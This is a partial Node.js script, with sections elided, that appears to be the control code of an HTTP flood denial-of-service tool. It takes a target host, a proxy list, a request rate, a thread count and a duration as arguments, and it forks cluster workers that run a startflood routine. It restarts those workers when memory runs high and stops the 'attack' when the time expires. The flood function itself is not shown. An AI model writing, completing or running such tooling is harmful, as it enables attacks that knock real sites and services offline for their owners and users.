...
function monitorRAM() {
    ...
    if (ramUsage > threshold) {
        console.log('RAM usage exceeds threshold. Restarting script...');
        ...
        // Calculate elapsed time since the last check
        const elapsedTime = checkInterval;
        remainingTime = Math.max(0, remainingTime - elapsedTime); // Update remaining time

        // Set up cluster for restart with the same arguments
        cluster.setupMaster({
            exec: 'http.js',
            args: process.argv.slice(2) 
        });

        // Fork a new worker per thread specified
        for (let counter = 1; counter <= args.threads; counter++) {
            cluster.fork();
        }
    }

    // If remainingTime reaches zero, exit the process.
    if (remainingTime <= 0) {
        console.log('Duration expired. Exiting...');
        process.exit(0);
    }
}
...
// Parse arguments
const args = {
    mode: process.argv[2].toUpperCase(),
    host: process.argv[3],
    proxies: process.argv[4],
    duration: parseInt(process.argv[5]),
    rate: parseInt(process.argv[6]),
    threads: parseInt(process.argv[7])
};

remainingTime = args.duration * 1000; // Duration in milliseconds
...
if (cluster.isMaster) {
    ...
    // Start monitoring at defined intervals
    setInterval(monitorRAM, checkInterval);
    
    // This timeout will control how long the attack lasts based on args.duration
    setTimeout(() => {
        console.log('Attack duration expired. Exiting...');
        process.exit(1);
    }, args.duration * 1000); // Set this to your duration in milliseconds
} else {
    startflood();
}
